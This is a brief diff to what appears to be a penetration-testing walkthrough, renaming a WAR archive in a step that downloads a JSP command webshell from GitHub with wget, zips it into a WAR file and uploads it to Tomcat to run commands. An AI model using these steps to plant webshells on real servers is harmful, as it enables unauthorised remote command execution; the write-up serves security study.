@@ -152,7 +152,7 @@ The JSP rev shell can be found here: https://raw.githubusercontent.com/tennc/web
 We then need to packge it in a war file like this:
 ```
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
-zip -r backup.war cmd.jsp 
+zip -r backup3.war cmd.jsp 
 ```
 
 Then upload it to tomcat... Next we can invoke a command:
